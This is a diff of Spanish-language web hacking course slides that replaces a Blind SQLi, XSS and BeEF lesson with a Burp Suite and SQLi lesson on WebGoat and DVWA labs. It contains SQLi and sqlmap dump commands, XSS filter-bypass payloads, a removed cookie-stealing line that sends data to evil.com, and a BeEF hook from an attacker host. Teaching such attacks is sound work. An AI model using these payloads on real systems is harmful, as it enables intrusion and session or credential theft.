@@ -8,17 +8,32 @@
 
 # Web Hacking
 ## Módulo 2 — Clase 2
-### Blind SQLi, XSS, contextos de ejecución y control del navegador
+### Burp Suite y SQLi con herramientas profesionales
 
 ---
 
 ## Recap breve: Clase 1
 
-- SQLi = la base de datos ejecuta datos como consulta
-- El contexto (string vs numérico) define cómo armar el payload
-- UNION SELECT para extraer datos de otras tablas
+- Command Injection, File Inclusion, CSRF y SQLi manual
+- El problema común: **datos mezclados con instrucciones**
+- SQLi básico con UNION SELECT en DVWA
 - SQLMap automatiza, pero primero hay que entender la falla
-- Command Injection, File Inclusion y CSRF comparten la misma causa raíz: **datos mezclados con instrucciones**
+- Contextos de inyección: string vs numérico
+
+> Hoy damos el salto: de curl y navegador a **Burp Suite**, la herramienta estándar de la industria.
+
+---
+
+## ¿Por qué los alumnos quieren Burp ahora?
+
+Feedback real de la clase pasada:
+- "¿Cuándo usamos Burp?"
+- "Los pentesters profesionales no usan curl para todo"
+- "Quiero automatizar ataques, no tipear payloads a mano"
+
+Tenían razón.
+
+**Burp Suite es la navaja suiza del pentesting web**. Y es momento de aprenderla.
 
 ---
 
@@ -26,455 +41,597 @@
 
 | Bloque | Contenido | Tiempo aprox. |
 |---|---|---|
-| **1** | Blind SQL Injection: boolean y time-based | ~25 min |
-| **2** | XSS: fundamentos, tipos y contextos | ~35 min |
-| 🧪 | Demo 1: Reflected XSS en WebGoat | ~20 min |
-| **3** | DOM XSS, bypass de filtros y payloads | ~25 min |
-| 🧪 | Demo 2: DOM XSS en WebGoat | ~20 min |
-| **4** | BeEF: control del navegador post-XSS | ~15 min |
-| 🏁 | Desafío + cierre del módulo | ~5 min |
+| **1** | ¿Qué es Burp Suite y por qué lo usamos? | ~10 min |
+| **2** | Setup e interfaz: Proxy, Repeater, Intruder | ~30 min |
+| 🧪 | Demo 1: Interceptar y modificar requests | ~15 min |
+| **3** | SQLi con Burp en WebGoat | ~35 min |
+| 🧪 | Demo 2: Blind SQLi con Intruder | ~20 min |
+| **4** | Preview: XSS y próxima clase | ~10 min |
 
 ---
 
-## Blind SQL Injection
+## ¿Qué es Burp Suite?
 
-A veces no vemos errores ni resultados directos.
-La app no muestra datos de la base, pero **sí cambia su comportamiento** según la consulta.
+Burp Suite es una **plataforma de análisis de seguridad** orientada a la explotación manual de aplicaciones web.
 
-Dos técnicas:
-- **Boolean-based:** la respuesta cambia (contenido, tamaño, redirección)
-- **Time-based:** el servidor tarda más si la condición es verdadera
+Su función principal: actuar como **intermediario** entre el navegador y el servidor, permitiendo:
+- Inspeccionar tráfico HTTP/HTTPS
+- Modificar requests antes de enviarlas
+- Repetir y automatizar ataques
+- Analizar respuestas del servidor
 
-La explotación es más lenta, pero el impacto es el mismo.
+**Se emplea en:**
+- Auditorías de seguridad web
+- Pruebas de penetración manuales
+- Análisis de lógica de aplicaciones
+
+---
+
+## Burp Suite: Manual vs Automático
+
+> **Burp Suite no "encuentra vulnerabilidades por sí solo"**
+
+Facilita el **razonamiento del analista**.
+
+Tiene escaneo automático (pasivo y activo), pero su valor real está en:
+- Interceptar y modificar tráfico en tiempo real
+- Repetir requests con variaciones
+- Automatizar ataques que **vos diseñás**
+
+No es un "botón mágico". Es una herramienta para pentesters que **entienden** lo que buscan.
+
+---
+
+## Instalación de Burp Suite Community Edition
+
+### Requisitos
+- Sistema operativo Windows, Linux o macOS
+- Java Runtime (si la versión no lo incluye)
+
+### Proceso
+1. Descargar la versión **Community** (gratuita)
+2. Ejecutar el instalador o archivo `.jar`
+3. Iniciar un **proyecto temporal**
+4. Usar la configuración por defecto
+
+**En Kali Linux:** Ya viene preinstalado → menú Applications → Web Application Analysis → Burp Suite
+
+---
+
+## Interfaz de Burp Suite
+
+La interfaz se compone de:
+- **Barra de menú** (configuración, scope, extensiones)
+- **Pestañas funcionales** (tabs principales)
+- **Panel de solicitudes y respuestas**
+
+Cada área está diseñada para una fase del análisis.
+
+---
+
+## Tabs Principales (las que vamos a usar hoy)
+
+| Tab | Para qué sirve |
+|-----|----------------|
+| **Dashboard** | Centro de control, estado del proyecto |
+| **Proxy** | Interceptar y modificar tráfico HTTP/HTTPS |
+| **Target** | Definir alcance (scope) de la prueba |
+| **Repeater** | Reenviar requests manualmente con modificaciones |
+| **Intruder** | Automatizar ataques controlados (fuzzing, fuerza bruta) |
+
+Las que NO vamos a usar hoy (las veremos en M3):
+- Decoder, Comparer, Extensions
+
+---
+
+## Dashboard
+
+- Panel central de control de Burp Suite
+- Muestra el estado del proyecto activo
+- Gestión de extensiones (BApp Store)
+- Vista de tareas en ejecución
+
+**Para hoy:** Solo necesitamos saber que existe. La acción está en los otros tabs.
+
+---
+
+## Target (Scope)
+
+- Define **qué aplicaciones o sitios web** forman parte del análisis
+- Permite establecer el **alcance (scope)** de la prueba
+- Incluye dominios, subdominios, IPs, protocolos y rutas
+
+**¿Por qué importa?**
+- El tráfico **dentro del scope** es interceptado y analizado
+- El tráfico **fuera del alcance** se filtra o ignora
+- Evita ruido (ads, analytics, CDNs)
+
+---
+
+## Proxy: El corazón de Burp
+
+Permite **interceptar, inspeccionar y modificar** tráfico HTTP y WebSocket.
+
+Funciona como un **Man-in-the-Middle controlado** entre navegador y aplicación.
+
+**Funcionalidades clave:**
+- Intercepción en tiempo real
+- Las peticiones y respuestas pueden analizarse, editarse o descartarse
+- Historial de todo el tráfico interceptado
+- Reglas automáticas (match and replace)
+
+---
+
+## Proxy: ¿Cómo funciona?
+
+Flujo de comunicación:
+
+```
+Navegador → Burp Proxy (intercepción) → Servidor
+             ↑
+          Modificación
+```
+
+1. El navegador envía una solicitud
+2. **Burp Suite intercepta** la petición (la detiene temporalmente)
+3. El analista puede **modificarla**
+4. La solicitud es enviada al servidor
+5. La respuesta vuelve a pasar por Burp antes de llegar al navegador
+
+> Este enfoque permite romper la suposición: **"el cliente no alterará los datos enviados"**
+
+---
+
+## Proxy: Configuración del Navegador
+
+Para que el navegador envíe tráfico a Burp:
+
+1. **Configurar proxy en el navegador:**
+   - Servidor: `127.0.0.1`
+   - Puerto: `8080` (por defecto)
+
+2. **Instalar certificado CA de Burp:**
+   - Navegar a `http://burp` con el proxy activado
+   - Descargar el certificado CA
+   - Importarlo en el navegador (para inspeccionar HTTPS)
+
+**Tip:** En Firefox, usar FoxyProxy para cambiar entre proxy y navegación normal fácilmente.
+
+---
+
+## 🧪 Demo guiada 1 — Interceptar y modificar requests
+
+**Target:** Formulario de login simple en WebGoat
+
+Secuencia:
+1. Levantar Burp Suite → tab **Proxy** → activar **Intercept**
+2. En el navegador, intentar login con credenciales incorrectas
+3. Burp congela la request → la vemos en Proxy → Intercept
+4. Modificar parámetros (user, password)
+5. Click en **Forward** → enviar al servidor
+6. Ver la respuesta en el navegador
+
+**Objetivo:** Entender el flujo de intercepción antes de usarlo para explotar.
+
+---
+
+## Repeater: Reenviar Requests Manualmente
+
+Permite **reenviar manualmente** una petición HTTP con modificaciones.
+
+**Uso típico:**
+1. Interceptar una request en Proxy
+2. Click derecho → **Send to Repeater**
+3. En Repeater, modificar parámetros, headers, método
+4. Click en **Send** → ver respuesta inmediatamente
+5. Repetir con variaciones
+
+**Ventajas:**
+- Separa claramente request y response
+- Muestra códigos de estado, encabezados y contenido
+- Ideal para **pruebas iterativas** (cambiar payload, ver resultado, ajustar)
+
+---
+
+## Intruder: Automatizar Ataques Controlados
+
+Se utiliza para **automatizar ataques** sobre una petición específica.
+
+**Se emplea principalmente para:**
+- Fuerza bruta (credenciales, tokens, IDs)
+- Fuzzing (inyectar payloads en múltiples posiciones)
+- Validación de entradas (probar caracteres especiales, encoding)
+
+**Flujo:**
+1. Enviar request a Intruder (desde Proxy o Repeater)
+2. Marcar **positions** (dónde insertar payloads)
+3. Cargar **payloads** (wordlists, números, custom)
+4. Seleccionar **tipo de ataque** (Sniper, Battering Ram, Pitchfork, Cluster Bomb)
+5. Iniciar ataque → analizar respuestas
+
+---
+
+## Intruder: Tipos de Ataque
+
+| Tipo | Descripción | Uso típico |
+|------|-------------|------------|
+| **Sniper** | Prueba un parámetro a la vez con todos los payloads | Fuzzing puntual, detectar qué campo es vulnerable |
+| **Battering Ram** | Usa el mismo payload en todas las posiciones marcadas | Pruebas simples de credenciales |
+| **Pitchfork** | Múltiples listas de payloads en paralelo (una por posición) | User:Pass de listas pareadas |
+| **Cluster Bomb** | Combina todos los payloads entre sí (producto cartesiano) | Pruebas exhaustivas (lento pero completo) |
+
+**Nota:** Hoy vamos a usar solo **Sniper**, el tipo de ataque más simple.
+
+---
+
+## Intruder: Posiciones (Positions)
+
+Las **positions** indican qué partes de la petición serán modificadas.
+
+**Funciones:**
+- **Add**: Agrega manualmente una posición (seleccionar texto → Add §)
+- **Clear**: Elimina todas las posiciones
+- **Auto**: Detecta automáticamente posibles parámetros atacables
+
+Burp marca las posiciones con `§valor§`:
+
+```http
+POST /login HTTP/1.1
+...
+
+username=§admin§&password=§test123§
+```
+
+---
+
+## SQLi con Burp Suite en WebGoat
+
+Ahora que sabemos usar Burp, volvamos a SQLi.
+
+**¿Por qué Burp para SQLi?**
+- Interceptar y modificar **sin editar URL a mano**
+- **Repeater** para probar payloads iterativamente
+- **Intruder** para blind SQLi (automatizar boolean/time-based)
+- Ver respuestas completas (headers, body, timing)
+
+**Target de hoy:** WebGoat → SQL Injection (Advanced)
+
+---
+
+## SQLi en WebGoat: Metodología
+
+1. **Identificar punto de inyección** (campo vulnerable)
+2. **Confirmar SQLi** con payload básico (`' OR 1=1--`)
+3. **Determinar número de columnas** (UNION SELECT)
+4. **Extraer datos** de otras tablas
+5. **Documentar** findings
+
+**Con Burp:**
+- Proxy → interceptar request del formulario
+- Repeater → probar payloads
+- Intruder → automatizar extracción (si es blind)
+
+---
+
+## 🧪 Demo guiada 2 — SQLi básico con Repeater
+
+**Target:** WebGoat → SQL Injection (Intro) → String SQL Injection
+
+Pasos:
+1. Completar formulario en WebGoat normalmente
+2. Interceptar con Burp Proxy
+3. Send to Repeater
+4. Modificar el parámetro vulnerable:
+
+```sql
+name=John' OR '1'='1
+```
+
+5. Enviar → analizar respuesta
+6. Confirmar bypass de autenticación
 
 ---
 
 ## Blind SQLi: Boolean-based
 
-Observamos diferencias en la respuesta para inferir datos **un carácter a la vez**:
+A veces no vemos errores ni resultados directos, pero **la respuesta cambia** según la consulta.
+
+**Técnica:** Hacer preguntas Sí/No a la base de datos.
+
+**Lógica:**
+- Si la condición inyectada es **verdadera** → respuesta A (ej: "User already exists")
+- Si es **falsa** → respuesta B (ej: "User created")
+
+Esa diferencia es nuestro **oráculo booleano**: podemos hacer preguntas de Sí/No a la base de datos.
+
+---
+
+## SUBSTRING(): Nuestra herramienta de extracción
+
+`SUBSTRING(string, posición, largo)` — extrae una porción de un texto.
 
 ```sql
-' AND SUBSTRING(database(),1,1)='a' --
-' AND SUBSTRING(database(),1,1)='b' --
-...
-' AND (SELECT COUNT(*) FROM users) > 5 --
+SUBSTRING('secretpass', 1, 1)  → 's'
+SUBSTRING('secretpass', 2, 1)  → 'e'
+SUBSTRING('secretpass', 3, 1)  → 'c'
+SUBSTRING('secretpass', 1, 4)  → 'secr'
 ```
 
-Lógica:
-- Si la condición es **verdadera** → respuesta normal
-- Si es **falsa** → respuesta distinta (error, vacía, redirección)
+| Parámetro | Qué es | Ejemplo |
+|-----------|--------|---------|
+| 1º | El string o columna | `password` |
+| 2º | Desde qué posición (**empieza en 1**) | `3` = tercer carácter |
+| 3º | Cuántos caracteres extraer | `1` = uno solo |
 
-Con suficientes requests, reconstruimos el valor completo.
+Sinónimos según motor SQL: `SUBSTR()`, `MID()` — hacen lo mismo.
+
+---
+
+## El proceso natural de descubrimiento
+
+Un pentester no va directo a `SUBSTRING`. Sigue estos pasos:
+
+**Paso 1 — Confirmar la inyección:**
+```sql
+tom' AND 1=1--    → "User already exists"  (TRUE)
+tom' AND 1=2--    → no dice que existe       (FALSE)
+```
+✅ Confirmado: es inyectable y tenemos oráculo booleano.
+
+**Paso 2 — Elegir qué extraer:**
+Queremos el password de tom → usamos `SUBSTRING(password, pos, 1)`
+
+**Paso 3 — Iterar carácter por carácter:**
+```sql
+tom' AND substring(password,1,1)='a'--  → no existe
+tom' AND substring(password,1,1)='b'--  → no existe
+...
+tom' AND substring(password,1,1)='t'--  → "already exists" ✅
+```
+Primer carácter = `t`. Repetir para posición 2, 3, 4...
+
+**Paso 4 — Automatizar** (demasiado lento a mano → Burp Intruder o Python)
+
+---
+
+## 🧪 Ejercicio WebGoat: Login as Tom
+
+**Target:** WebGoat → SQL Injection (Advanced) → Lesson 4
+
+El formulario de **registro** consulta si el usuario existe:
+```sql
+SELECT * FROM users WHERE username = '<input>'
+```
+
+**Explotación paso a paso:**
+
+| Payload en username | Respuesta | Significado |
+|---------------------|-----------|-------------|
+| `tom' AND 1=1--` | Already exists | ✅ Inyectable |
+| `tom' AND 1=2--` | User created | ✅ Oráculo confirmado |
+| `tom' AND substring(password,1,1)='t'--` | Already exists | 1er carácter = `t` |
+| `tom' AND substring(password,2,1)='h'--` | Already exists | 2do carácter = `h` |
+
+Con **Burp Intruder (Cluster Bomb)**: posición × carácter → extraés el password completo.
+
+Con el password → login como tom en el formulario normal.
 
 ---
 
 ## Blind SQLi: Time-based
 
-Cuando ni siquiera hay diferencias visibles en la respuesta, medimos **tiempos**:
+Cuando **ni siquiera** hay diferencias visibles en la respuesta, medimos **tiempos**.
 
 ```sql
 ' AND IF(database()='app_db', SLEEP(5), 0) --
-' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) --
 ```
 
-Con curl para medir:
+**Lógica:**
+- Si tarda ~5 segundos → condición verdadera
+- Si responde rápido → condición falsa
+
+Es **lento**, pero funciona incluso cuando no hay output visible.
+
+---
+
+## 🧪 Demo guiada 3 — Blind SQLi con Intruder
+
+**Target:** WebGoat → SQL Injection (Advanced) → Blind Numeric SQL Injection
+
+Pasos:
+1. Identificar campo vulnerable (ej: `id`)
+2. Interceptar request con Burp
+3. Send to Intruder
+4. Marcar position en el parámetro `id`
+5. En la pestaña Payloads:
+   - Tipo: Numbers (1-100)
+   - Agregar prefijo: `' AND SLEEP(2)--`
+6. Ordenar resultados por **Response received** (timing)
+7. Los que tarden ~2 segundos más → inyección exitosa
+
+---
+
+## Intruder: Analizar Resultados
+
+Columnas útiles en la tabla de resultados:
+
+| Columna | Qué indica |
+|---------|------------|
+| **Status** | Código HTTP (200, 302, 500) |
+| **Length** | Tamaño de la respuesta (cambios = comportamiento distinto) |
+| **Time (Response received)** | Timing (útil para time-based SQLi) |
+| **Payload** | Qué payload se usó |
+
+**Tip:** Ordenar por Length o Time para identificar respuestas anómalas.
+
+---
+
+## SQLMap: automatización con criterio
+
+SQLMap automatiza:
+- detección del punto de inyección
+- fingerprint del motor DB
+- enumeración de bases, tablas y columnas
+- extracción de datos
+- bypass de WAFs
+
+Estructura base:
 
 ```bash
-time curl -s "http://target/product?id=1' AND SLEEP(5)--"
+sqlmap -u "http://target/product.php?id=1"
 ```
 
-Si tarda ~5 segundos → condición verdadera.
-Si responde rápido → condición falsa.
-
-Es lento, pero funciona incluso cuando no hay **ningún** output visible.
+Pero automatizar no significa apagar el criterio.
 
 ---
 
-## Cross-Site Scripting (XSS)
+## SQLMap: flags esenciales
 
-**XSS** ocurre cuando una aplicación permite que contenido controlado por un atacante sea interpretado por el navegador de otra persona.
-
-El problema no es JavaScript en sí.
-
-El problema es no distinguir entre:
-1. **Datos legítimos**
-2. **Código ejecutable**
-
-Cuando esa distinción falla, el navegador ejecuta instrucciones que nunca debieron estar ahí.
-
----
-
-## ¿Por qué XSS sigue en el OWASP Top 10?
-
-- Afecta al **lado cliente** — muchos devs solo protegen el servidor
-- Los frameworks modernos mitigan *algunos* casos, pero no todos
-- DOM XSS no pasa por el backend → escapa a validaciones server-side
-- El impacto real va mucho más allá de un `alert()`
+| Opción | Función |
+|---|---|
+| `-u URL` | URL con parámetro inyectable |
+| `--data="user=x&pass=y"` | POST data |
+| `--cookie="PHPSESSID=abc"` | Cookie de sesión |
+| `--technique=BEUSTQ` | Técnicas a probar |
+| `--level=1-5` | Profundidad de pruebas |
+| `--risk=1-3` | Riesgo (1=safe, 3=agresivo) |
+| `--batch` | No interactivo |
+| `--dbs` | Enumerar bases de datos |
+| `-D nombre --tables` | Tablas de una base |
+| `-D nombre -T tabla --dump` | Extraer datos |
 
 ---
 
-## Contextos de ejecución
-
-No todo payload funciona en todos los lugares. El navegador interpreta distinto según dónde caiga el input:
-
-| Contexto | Ejemplo vulnerable | Payload |
-|---|---|---|
-| **HTML** | `<p>Hola INPUT</p>` | `<script>alert(1)</script>` |
-| **Atributo** | `<img src="INPUT">` | `" onerror="alert(1)` |
-| **JavaScript** | `var x = 'INPUT';` | `';alert(1);//` |
-| **URL/href** | `<a href="INPUT">` | `javascript:alert(1)` |
-
-La regla: **identificar el contexto antes de armar el payload**.
-
----
-
-## Cómo detectar XSS: metodología
-
-1. Encontrar puntos de entrada (parámetros GET, POST, headers, fragmentos)
-2. Inyectar un string único de prueba (canary): `xss123test`
-3. Buscar dónde se refleja en la respuesta
-4. Determinar el contexto (HTML, atributo, JS, DOM)
-5. Armar el payload acorde al contexto
-6. Confirmar ejecución
-
-Con curl para detectar reflexión:
+## SQLMap: flujo práctico completo
 
 ```bash
-# Inyectar canary y buscar en la respuesta
-curl -s "http://target/search?q=xss123test" | grep "xss123test"
+# 1. Detectar inyección
+sqlmap -u "http://target/page.php?id=1" --batch
 
-# Ver en qué contexto cae
-curl -s "http://target/search?q=xss123test" | grep -B2 -A2 "xss123test"
+# 2. Enumerar bases de datos
+sqlmap -u "http://target/page.php?id=1" --dbs --batch
+
+# 3. Enumerar tablas de una base
+sqlmap -u "http://target/page.php?id=1" -D webapp --tables --batch
+
+# 4. Extraer columnas
+sqlmap -u "http://target/page.php?id=1" -D webapp -T users --columns --batch
+
+# 5. Dump selectivo
+sqlmap -u "http://target/page.php?id=1" -D webapp -T users \
+  -C "username,password" --dump --batch
+
+# 6. Con POST y cookie
+sqlmap -u "http://target/login" --data="user=test&pass=test" \
+  --cookie="session=abc123" --level=3 --risk=2 --batch
 ```
 
 ---
 
-## XSS Reflejado (Reflected XSS)
+## SQLMap: buenas prácticas
 
-El payload:
-1. Sale del navegador (en la URL o body)
-2. Llega al servidor
-3. Vuelve inmediatamente en la respuesta sin sanitizar
-
-Típico en:
-- Buscadores internos
-- Mensajes de error
-- Parámetros GET/POST reflejados
-- Páginas de resultados
-
-Ejemplo:
-
-```
-https://sitio.com/buscar?q=<script>alert('XSS')</script>
-```
+1. **Confirmar manualmente antes** — si no entendés la falla, SQLMap tampoco la va a explicar
+2. **Empezar con level=1, risk=1** — subir solo si no detecta
+3. **Extraer solo lo necesario** — `--dump` sin filtros puede tardar horas
+4. **Guardar evidencia** — usar `--output-dir`
+5. **No usar en producción sin autorización** — genera cientos de requests ruidosos
 
 ---
 
-## XSS Persistente (Stored XSS)
+## Comparación: Manual vs Burp
 
-El payload se **almacena** en el servidor (DB, archivo, log) y se ejecuta cada vez que alguien accede al contenido.
-
-Aparece en:
-- Comentarios y foros
-- Perfiles de usuario
-- Mensajes privados
-- Paneles de administración (logs)
-- Campos que se renderizan en otros contextos
-
-Impacto: afecta a **múltiples víctimas** sin que el atacante intervenga de nuevo.
+| Tarea | Manual (curl/navegador) | Con Burp Suite |
+|-------|-------------------------|----------------|
+| Probar 1 payload | Tipear URL/parámetro | Repeater: modificar y Send |
+| Probar 100 payloads | Scripting o copy-paste | Intruder: cargar wordlist, ejecutar |
+| Interceptar HTTPS | Complejo (mitmproxy, config) | Instalás certificado y listo |
+| Ver request/response completos | `curl -v` parsear output | UI limpia, tabs separados |
+| Repetir con modificaciones | Editar comando completo | Modificar campo específico |
 
 ---
 
-## XSS basado en DOM (DOM XSS)
+## XSS: Preview de la Próxima Clase
 
-La vulnerabilidad está en el JavaScript del **cliente**. El servidor puede comportarse correctamente.
+**Cross-Site Scripting (XSS)** ocurre cuando una aplicación permite que contenido controlado por un atacante sea **interpretado por el navegador** de otra persona.
 
-El modelo mental:
+**El problema:** No distinguir entre datos legítimos y código ejecutable.
 
-```
-SOURCE (de dónde viene el dato) → SINK (dónde se ejecuta)
-```
-
-Sources comunes:
-- `location.hash`, `location.search`
-- `document.URL`, `document.referrer`
-- `window.name`, `postMessage`
-
-Sinks peligrosos:
-- `innerHTML`, `outerHTML`
-- `document.write()`
-- `eval()`, `setTimeout(string)`, `Function()`
-- `element.src`, `element.href`
+**Tipos:**
+- **Reflected XSS**: El payload se refleja inmediatamente en la respuesta
+- **Stored XSS**: El payload se almacena (DB, archivo) y afecta a múltiples víctimas
+- **DOM XSS**: La vulnerabilidad está en el JavaScript del cliente
 
 ---
 
-## DOM XSS: ejemplo concreto
+## XSS: Un Ejemplo Rápido
 
 Código vulnerable:
 
-```javascript
-// Source: location.hash
-var input = document.location.hash.substring(1);
-// Sink: innerHTML
-document.getElementById('output').innerHTML = input;
+```php
+<?php
+echo "<p>Hola " . $_GET["nombre"] . "</p>";
+?>
 ```
 
-Explotación:
+URL maliciosa:
 
 ```
-http://target/page#<img src=x onerror=alert(document.cookie)>
+http://sitio.com/saludo.php?nombre=<script>alert(document.cookie)</script>
 ```
 
-El servidor nunca ve el payload (está después del `#`). Solo el navegador lo procesa.
-
----
-
-## Comparativa de tipos
-
-| Pregunta | Reflected | Stored | DOM |
-|---|---|---|---|
-| ¿Pasa por servidor? | Sí | Sí (se guarda) | No necesariamente |
-| ¿Dónde está la falla? | Renderizado server-side | Almacenamiento + renderizado | JavaScript del cliente |
-| ¿Cómo lo investigás? | Request/response | Buscar dónde se almacena | DevTools + sources + DOM |
-| ¿Persistente? | No | Sí | Depende del source |
-| ¿Víctimas? | 1 por click | Todas las que accedan | 1 por click (generalmente) |
-
----
-
-## 🧪 Demo guiada 1 — Reflected XSS en WebGoat
-
-**Target:** `Cross Site Scripting → Try It! Reflected XSS`
-
-Pasos:
-1. Abrir WebGoat → módulo Cross Site Scripting → pantalla 7
-2. Probar valores normales en los campos del formulario
-3. Inyectar el canary `test123` y ver dónde se refleja
-4. Probar payload según contexto:
+Output en el navegador:
 
 ```html
-"><script>alert('XSS')</script>
+<p>Hola <script>alert(document.cookie)</script></p>
 ```
 
-5. Identificar el campo vulnerable
-6. Explicar por qué ese campo y no el otro
+El navegador **ejecuta** el script. El atacante puede robar cookies, sesiones, o redirigir a phishing.
 
 ---
 
-## Entregables del lab
+## XSS con Burp Suite
 
-Lo que deberían documentar:
-- Captura del `alert('XSS')` ejecutándose
-- Nombre del campo vulnerable
-- Recomendación breve de mitigación
+**¿Por qué Burp para XSS?**
+- Interceptar y modificar **headers y body** (no solo URL)
+- Probar payloads en múltiples contextos (HTML, atributo, JavaScript)
+- Intruder para **fuzzing de filtros** (bypass de blacklists)
+- Repeater para refinar payloads iterativamente
 
-Mitigaciones esperadas:
-- Escape/encoding según contexto (HTML entities, JS escape, URL encode)
-- No insertar input crudo en HTML
-- CSP como defensa en profundidad (no como parche único)
-- Frameworks con auto-escape por defecto (React, Angular)
-
----
-
-## Bypass de filtros
-
-Muchos filtros fallan porque hacen blacklist de patrones obvios:
-- Bloquean `<script>` → pero no `<img onerror=...>`
-- Bloquean `alert` → pero no `confirm`, `prompt`, `fetch`
-- Bloquean comillas → pero no backticks en template literals
-
-Payloads de bypass comunes:
-
-```html
-<img src=x onerror=alert(1)>
-<svg onload=alert(1)>
-<body onload=alert(1)>
-<input onfocus=alert(1) autofocus>
-<details open ontoggle=alert(1)>
-<marquee onstart=alert(1)>
-```
+**Próxima clase:**
+- XSS reflected, stored y DOM en detalle
+- Bypass de filtros y WAFs
+- BeEF Framework: Control del navegador de la víctima tras explotar XSS
 
 ---
 
-## Bypass: encoding y ofuscación
+## Resumen de lo aprendido
 
-```html
-<!-- Case variation -->
-<ScRiPt>alert(1)</sCrIpT>
-
-<!-- HTML entities -->
-<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
-
-<!-- Sin paréntesis (bypass WAF) -->
-<img src=x onerror=alert`1`>
-
-<!-- Sin comillas ni espacios -->
-<svg/onload=alert(1)>
-
-<!-- Evento con tab/newline -->
-<img src=x	onerror
-=alert(1)>
-```
-
-La seguridad por blacklist es frágil: el navegador tiene **muchas formas válidas** de ejecutar código.
+- **Burp Suite** es el proxy interceptor estándar de la industria
+- Configuración: proxy en navegador + certificado CA
+- **Proxy** para interceptar, **Repeater** para iterar, **Intruder** para automatizar
+- SQLi con Burp: Repeater para payloads manuales, Intruder para blind SQLi
+- Blind SQLi boolean y time-based: extraer datos sin output directo
+- XSS es el siguiente tema (lo profundizamos próxima clase)
 
 ---
 
-## Herramientas para encontrar XSS
+## Próxima clase
 
-| Herramienta | Uso |
-|---|---|
-| **Burp Suite Repeater** | Manipular parámetros y ver reflexión en respuesta |
-| **DevTools → Elements** | Ver dónde se inserta el input en el DOM |
-| **DevTools → Sources** | Leer el JavaScript que maneja el input |
-| **DevTools → Console** | Probar payloads directo |
-| `curl + grep` | Detectar reflexión automatizada |
-| **dalfox** | Scanner de XSS automatizado |
-
-```bash
-# dalfox básico
-dalfox url "http://target/search?q=test" --blind your.xss.ht
-
-# Con pipe desde parámetros descubiertos
-echo "http://target/page?name=test" | dalfox pipe
-```
+**Módulo 2 — Clase 3:**
+- XSS Reflected, Stored y DOM en profundidad
+- Contextos de ejecución y payloads específicos
+- Bypass de filtros y encoding
+- BeEF: Framework de explotación del navegador
+- Proyecto integrador del Módulo 2
 
 ---
 
-## 🧪 Demo guiada 2 — DOM XSS en WebGoat
+## Gracias
 
-**Target:** `Cross Site Scripting → Identify potential for DOM-Based XSS` (pantalla 10-11)
+**¿Preguntas?**
 
-Pasos:
-1. Abrir DevTools → Sources
-2. Revisar el JavaScript que procesa la URL
-3. Identificar el **source** (¿qué parte de la URL se lee?)
-4. Identificar el **sink** (¿dónde se inserta?)
-5. Modificar la URL con un texto de prueba
-6. Construir payload DOM XSS:
+Recuerden practicar en WebGoat y DVWA.
 
-```
-http://target/WebGoat/start.mvc#test/<script>alert('DOM-XSS')</script>
-```
+Burp Suite es una herramienta **que se aprende usándola**.
 
----
-
-## Después de la demo: diferencias clave
-
-| Aspecto | Reflected XSS | DOM XSS |
-|---|---|---|
-| Herramienta principal | Burp / curl | DevTools |
-| Evidencia | Response del servidor contiene el payload | El DOM contiene el payload |
-| Detección automatizada | Fácil (scanners) | Difícil (requiere análisis de JS) |
-| Fix | Escape server-side | Sanitizar en el JS del cliente |
-
----
-
-## Impacto real de XSS
-
-Con XSS no solo mostrás un `alert(1)`.
-
-Un atacante puede:
-- Robar cookies/tokens: `new Image().src='http://evil.com/?c='+document.cookie`
-- Capturar credenciales: inyectar formulario falso
-- Keylogger: registrar todo lo que escribe la víctima
-- Redirigir: `location='http://phishing.com'`
-- Ejecutar acciones como la víctima: requests AJAX con su sesión
-- Escalar: hookear el navegador para pivotear
-
-Por eso `alert()` es **prueba de ejecución**, no el objetivo final.
-
----
-
-## Control del navegador con BeEF
-
-Si logramos ejecutar JavaScript, el navegador se convierte en una **plataforma de control**.
-
-BeEF (Browser Exploitation Framework) demuestra post-explotación:
-- Interacción con el DOM
-- Captura de credenciales
-- Reconocimiento de red interna (desde el navegador)
-- Ingeniería social (alertas, pop-ups falsos)
-- Detección de plugins y versión del browser
-
----
-
-## BeEF: cómo funciona
-
-1. El atacante inyecta un **hook** (script JS que conecta al panel BeEF):
-
-```html
-<script src="http://attacker:3000/hook.js"></script>
-```
-
-2. La víctima ejecuta el hook (via XSS)
-3. El navegador de la víctima se conecta al panel de BeEF
-4. El atacante ejecuta módulos desde el panel:
-   - Obtener cookies
-   - Detectar software instalado
-   - Capturar formularios
-   - Escanear red interna
-   - Social engineering (fake login, fake update)
-
----
-
-## Qué demuestra BeEF en clase
-
-BeEF rompe dos ideas ingenuas:
-
-1. *"Fue solo un alert, no pasa nada"* → se puede escalar a robo de sesión completo
-2. *"Si no toqué el servidor, el impacto es bajo"* → el navegador es un entorno de ejecución poderoso
-
-Un XSS puede ser el punto de entrada para:
-- Secuestro de sesión
-- Pivoteo dentro de la red (el browser de la víctima como proxy)
-- Abuso de confianza del usuario
-- Encadenamiento con CSRF u otras fallas
-
----
-
-## Mitigaciones contra XSS
-
-| Capa | Técnica |
-|---|---|
-| **Output encoding** | Escapar según contexto: HTML entities, JS escape, URL encode |
-| **Input validation** | Allowlists cuando el formato es predecible |
-| **CSP** | `Content-Security-Policy: default-src 'self'` bloquea inline scripts |
-| **HTTPOnly cookies** | Previene robo de sesión vía `document.cookie` |
-| **Framework auto-escape** | React, Angular, Vue escapan por defecto (excepto `dangerouslySetInnerHTML`) |
-| **DOM sanitization** | DOMPurify para contenido dinámico en el cliente |
-
-```
-Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
-```
-
----
-
-## Desafío — Para casa
-
-Objetivo:
-- Repetir y profundizar el DOM XSS del módulo WebGoat (pantalla 11)
-- Encontrar el parámetro vulnerable sin ayuda
-- Construir un payload que ejecute `alert()`
-
-Entrega sugerida:
-1. Parámetro vulnerable identificado
-2. Payload usado
-3. Captura/evidencia de ejecución
-4. Explicación del source y sink involucrados
-
----
-
-## Cierre del módulo 2
-
-Si tuvieras que resumir este módulo en una sola frase:
-
-> **Entender cómo interpreta datos cada componente te permite anticipar la explotación.**
-
-En este módulo vimos:
-- Base de datos interpretando datos como SQL (SQLi)
-- Sistema interpretando datos como comandos (Command Injection)
-- Servidor interpretando rutas como archivos (File Inclusion)
-- Navegador interpretando datos como JavaScript (XSS)
-- Navegador autenticado ejecutando acciones no intencionadas (CSRF)
-
